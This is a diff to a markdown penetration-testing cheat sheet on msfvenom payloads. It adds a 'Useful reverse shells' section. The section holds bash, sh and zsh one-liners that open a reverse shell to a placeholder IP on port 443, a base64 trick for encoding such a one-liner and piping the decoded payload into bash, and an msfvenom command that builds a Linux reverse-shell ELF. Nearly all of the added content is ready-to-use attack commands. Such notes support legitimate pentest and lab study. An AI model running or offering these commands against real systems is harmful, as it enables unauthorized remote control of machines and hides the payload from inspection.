@@ -8,7 +8,8 @@
   - [Introduction](#introduction)
   - [Table of Contents](#table-of-contents)
   - [Payload Structure - msfvenom](#payload-structure---msfvenom)
-  - [Non-Meterpreter Binaries](#non-meterpreter-binaries)
+  - [Non-Meterpreter shells](#non-meterpreter-shells)
+    - [Useful reverse shells](#useful-reverse-shells)
     - [Windows](#windows)
       - [x86 staged - msfvenom (Non-Meterpreter)](#x86-staged---msfvenom-non-meterpreter)
       - [x64 staged - msfvenom (Non-Meterpreter)](#x64-staged---msfvenom-non-meterpreter)
@@ -43,7 +44,30 @@ A staged payload is usually shipped in two parts. The first part contains a smal
 windows/shell_reverse_tcp (stageless)
 windows/shell/reverse_tcp (staged)
 
-## Non-Meterpreter Binaries
+## Non-Meterpreter shells
+
+### Useful reverse shells
+
+- Reverse shell oneliners:
+
+```sh
+bash -i >& /dev/tcp/<ip>/443 0>&1 # bash
+bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1" # sh or dash
+zsh -c 'zmodload zsh/net/tcp && ztcp <ip> 443 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' # zsh
+```
+
+- Reverse shell encoded oneliner:
+
+```sh
+echo "bash -c 'bash -i >& /dev/tcp/<ip>/443 0>&1'" | base64
+echo '<payload>' | base64 --decode | bash
+```
+
+- TCP reverse shell executable:
+
+```sh
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
+```
 
 ### Windows
 
